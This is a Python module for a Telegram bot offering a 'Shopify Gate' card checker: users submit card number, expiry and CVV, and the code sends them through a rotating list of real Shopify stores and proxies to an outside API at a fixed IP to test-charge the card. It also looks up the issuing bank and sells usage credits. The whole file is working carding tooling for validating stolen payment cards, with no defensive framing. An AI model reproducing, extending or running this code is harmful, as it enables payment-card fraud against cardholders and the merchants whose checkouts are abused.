"""
Shopify Gate
Command: /sh
Type: Single Check
API: http://72.61.18.119:7009/shopify
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import re
import asyncio
import time
import requests
import random
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from database import get_user_credits, update_credits, get_user, update_credits, get_user
from bin import get_bin_info
from sub import get_premium_status

router = Router()
user_last_command_time = {}

SHOPIFY_API = "http://72.61.18.119:7009/shopify"

APPROVED_RESPONSES = [
    "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED", "PENDING", "AUTHORIZED",
    "CAPTURED", "COMPLETED", "PAID", "FRAUD_REVIEW"
]

DECLINED_RESPONSES = [
    "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR", "INVALID_CARD",
    "EXPIRED_CARD", "INCORRECT_NUMBER", "PICKUP_CARD", "LOST_OR_STOLEN"
]

def get_response_status(response_text):
    response_text = response_text.upper().strip()
    
    if "ORDER_PLACED" in response_text:
        return "APPROVED"
    if "3DS" in response_text or "3D SECURE" in response_text:
        return "APPROVED"
    if "CVV" in response_text:
        return "APPROVED"
    if "AVS" in response_text:
        return "APPROVED"
    if "INSUFFICIENT" in response_text:
        return "APPROVED"
    
    for approved in APPROVED_RESPONSES:
        if approved in response_text:
            return "APPROVED"
    
    for declined in DECLINED_RESPONSES:
        if declined in response_text:
            return "DECLINED"
    
    if "ERROR" in response_text or "FAILED" in response_text:
        return "ERROR"
    
    return "UNKNOWN"

DEAD_SITES = []

def load_sites():
    sites = []
    try:
        if os.path.exists("sites.txt"):
            with open("sites.txt", "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith("http"):
                            line = "https://" + line
                        if line not in DEAD_SITES:
                            sites.append(line)
    except Exception as e:
        logging.error(f"Error loading sites: {e}")
    if not sites:
        sites = ["https://myfetaldoppler.com"]
    return sites

def remove_dead_site(site):
    if site and site not in DEAD_SITES:
        DEAD_SITES.append(site)
        try:
            with open("sites.txt", "r") as f:
                lines = f.readlines()
            with open("sites.txt", "w") as f:
                for line in lines:
                    if site not in line and site.replace("https://", "") not in line:
                        f.write(line)
        except:
            pass

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            user = await asyncio.to_thread(get_user, user_id)
            if user:
                return user.get("plan", "PREMIUM")
            return "PREMIUM"
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"

def luhn_check(card_number: str) -> bool:
    total = 0
    reverse_digits = card_number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def mask_site(site):
    if not site:
        return "N/A"
    try:
        site = site.replace('https://', '').replace('http://', '')
        domain = site.split('/')[0]
        if len(domain) > 20:
            return domain[:17] + '...'
        return domain
    except:
        return site[:20] + '...' if len(site) > 20 else site

def mask_proxy(proxy):
    if not proxy:
        return "None"
    try:
        parts = proxy.split(':')
        if len(parts) >= 2:
            return f"{parts[0]}:{parts[1]}"
        return proxy[:20] + '...' if len(proxy) > 20 else proxy
    except:
        return proxy[:20] + '...' if len(proxy) > 20 else proxy

async def process_shopify_card(cc, mm, yy, cvv, site=None, proxy=None):
    start = time.time()
    try:
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        if not site:
            sites = load_sites()
            site = random.choice(sites) if sites else "https://myfetaldoppler.com"
        
        params = {"cc": formatted_cc, "site": site}
        if proxy:
            params["proxy"] = proxy
        
        resp = requests.get(SHOPIFY_API, params=params, timeout=60, verify=False)
        
        if resp.status_code == 200:
            data = resp.json()
            elapsed = f"{time.time() - start:.2f}s"
            gateway = data.get('Gateway', 'Shopify Payments')
            price = data.get('Price', '0.00')
            raw_response = data.get('Response', 'Unknown')
            status_field = data.get('Status', False)
            
            detected_status = get_response_status(raw_response)
            
            if detected_status == "DECLINED":
                return {
                    "approved": False,
                    "message": f"{raw_response} ❌",
                    "status": "DECLINED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            
            if status_field:
                return {
                    "approved": True,
                    "message": f"{raw_response} ✅",
                    "status": "CHARGED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            
            if detected_status == "APPROVED":
                return {
                    "approved": True,
                    "message": f"{raw_response} ✅",
                    "status": "APPROVED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            elif "site not supported" in raw_response.lower():
                remove_dead_site(site)
                return {
                    "approved": False,
                    "message": "Site removed",
                    "status": "ERROR",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            else:
                return {
                    "approved": False,
                    "message": f"{raw_response} ❌",
                    "status": "DECLINED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
        else:
            remove_dead_site(site)
            elapsed = f"{time.time() - start:.2f}s"
            return {
                "approved": False,
                "message": f"API Error: {resp.status_code}",
                "status": "ERROR",
                "gateway": "Shopify",
                "price": "0.00",
                "site": site,
                "proxy": proxy or "None",
                "time": elapsed
            }
    except Exception as e:
        elapsed = f"{time.time() - start:.2f}s"
        return {
            "approved": False,
            "message": str(e)[:100],
            "status": "ERROR",
            "gateway": "Shopify",
            "price": "0.00",
            "site": site or "N/A",
            "proxy": proxy or "None",
            "time": elapsed
        }

@router.message(Command("sh"))
async def sh_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    if not is_premium:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"⚠️ <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    args = message.text.split()[1:]
    if not args:
        await message.reply(
            "💳 <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗚𝗮𝘁𝗲</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📟 𝗖𝗼𝗺𝗺𝗮𝗻𝗱: <code>/sh</code>\n"
            "📦 𝗠𝗮𝘀𝘀: <code>/msh</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 𝗨𝘀𝗮𝗴𝗲: <code>/sh CC|MM|YY|CVV</code>\n\n"
            "📝 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: <code>/sh 4111111111111111|12|25|123</code>",
            parse_mode="HTML"
        )
        return

    site = None
    proxy = None
    card = None

    for arg in args:
        if re.match(r'^\d{15,16}[|\s/?\\:]+\d{2,4}[|\s/?\\:]+\d{2,4}[|\s/?\\:]+\d{3,4}$', arg.replace('|', '|')):
            card = arg
        elif re.match(r'^https?://', arg):
            site = arg
        elif ':' in arg and not arg.startswith('http'):
            proxy = arg

    if not card:
        await message.reply("❌ <b>No card found!</b>\nUsage: <code>/sh CC|MM|YY|CVV</code>", parse_mode="HTML")
        return

    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, card)
    if not match:
        await message.reply("❌ <b>Invalid Card Format.</b>", parse_mode="HTML")
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    if not luhn_check(cc):
        await message.reply("❌ <b>Invalid Card</b>", parse_mode="HTML")
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await message.reply("❌ <b>Insufficient Credits!</b>", parse_mode="HTML")
        return

    plan_name = await get_user_plan_name(user_id)
    proc_msg = await message.reply("<pre>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴…⏳</pre>", parse_mode="HTML")
    asyncio.create_task(process_sh_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, site, proxy))

async def process_sh_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, site, proxy):
    result = await process_shopify_card(cc, formatted_cc.split('|')[1], formatted_cc.split('|')[2], formatted_cc.split('|')[3], site, proxy)

    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    status_raw = result.get("status", "").lower()
    res_message = result.get("message", "N/A")
    gateway = result.get("gateway", "Shopify Payments")
    price = result.get("price", "0.00")
    site_used = mask_site(result.get("site", site or "N/A"))
    proxy_used = mask_proxy(result.get("proxy", proxy or "None"))

    is_charged = False
    if status_raw in ["charged", "approved"]:
        final_status = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        is_charged = True
    elif status_raw == "declined":
        final_status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
    else:
        final_status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"

    credits_to_deduct = 2 if is_charged else 1 if status_raw == 'declined' else 0
    if credits_to_deduct > 0:
        current_balance = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, current_balance - credits_to_deduct)
        await asyncio.to_thread(update_credits, user_id, new_balance)

    user_link = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
    dev_link = '<a href="https://t.me/npnbit4">npnbit4</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"

    final_caption = (
        f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {final_status}\n"
        f"𝗖𝗮𝗿𝗱 ➛ <code>{formatted_cc}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ {gateway}\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{res_message}</b>\n"
        f"𝗣𝗿𝗶𝗰𝗲 ➛ ${price}\n"
        f"𝗦𝗶𝘁𝗲 ➛ {site_used}\n"
        f"𝗣𝗿𝗼𝘅𝘆 ➛ {proxy_used}\n"
        f"𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"𝗗𝗲𝘃 ➛ {dev_link}"
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

    try:
        await proc_msg.edit_text(text=final_caption, parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        await message.reply(text=final_caption, parse_mode="HTML", reply_markup=reply_markup)

@router.callback_query(F.data.startswith("sh_"))
async def sh_callback_handler(callback: types.CallbackQuery):
    await callback.answer("📊 Shopify gate", show_alert=False)
